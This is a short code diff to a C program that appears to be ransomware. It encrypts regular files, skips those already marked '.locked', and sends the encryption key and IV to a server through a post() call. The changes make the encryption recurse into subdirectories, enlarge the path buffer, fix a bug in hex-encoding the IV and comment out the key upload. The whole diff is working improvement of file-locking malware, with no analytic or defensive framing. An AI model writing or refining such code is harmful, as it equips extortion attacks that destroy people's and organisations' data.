@@ -104,15 +104,24 @@ void enDire(const char *directory, const unsigned char *key, const unsigned char
         if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
             continue;
 
-        char filepath[512];
+        char filepath[1024];
         snprintf(filepath, sizeof(filepath), "%s/%s", directory, entry->d_name);
 
         struct stat st;
-        if (stat(filepath, &st) == 0 && S_ISREG(st.st_mode))
+        if (stat(filepath, &st) == 0)
         {
-            if (strstr(entry->d_name, ".locked") == NULL)
+            if (S_ISDIR(st.st_mode))
             {
-                enF(filepath, key, iv);
+                // Se for diretório, chama recursivamente
+                enDire(filepath, key, iv);
+            }
+            else if (S_ISREG(st.st_mode))
+            {
+                // Se for arquivo regular e não estiver criptografado
+                if (strstr(entry->d_name, ".locked") == NULL)
+                {
+                    enF(filepath, key, iv);
+                }
             }
         }
     }
@@ -144,7 +153,7 @@ int main()
 
     for (int i = 0; i < BLOCK_SIZE; i++)
     {
-        sprintf(&hex_iv[i * 2 + 1], "%02x", iv[i]);
+        sprintf(&hex_iv[i * 2], "%02x", iv[i]);
     }
     char target_directory[1024];
 
@@ -152,7 +161,7 @@ int main()
 
     printf("%s", target_directory);
     enDire(target_directory, key, iv);
-    post(hex_key, hex_iv);
+    // post(hex_key, hex_iv);
 
     return 0;
 }
